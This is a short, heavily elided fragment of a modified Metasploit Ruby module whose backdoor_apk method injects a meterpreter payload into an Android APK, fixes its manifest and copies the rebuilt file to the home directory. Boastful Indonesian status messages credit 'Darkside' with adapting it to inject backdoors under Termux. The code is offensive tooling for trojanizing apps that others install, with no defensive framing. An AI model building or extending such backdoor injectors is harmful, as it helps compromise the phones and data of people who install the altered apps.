...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload)
   ...
   # apk_v = Gem::Version.new(apktool)
    ...
    print_status "Will We  Become To The A Hero\n"
    fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])

    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk} Cie Yang Udah Jadi Hacker wkwkwk \n"
print_status "Darkside@InYourHeart Cuma Sedikit Memodifikasi Metasploit Supaya Support Untuk Inject Backdoor Di Termux:)"
...
run_cmd("cp #{tempdir}/output.apk $HOME")
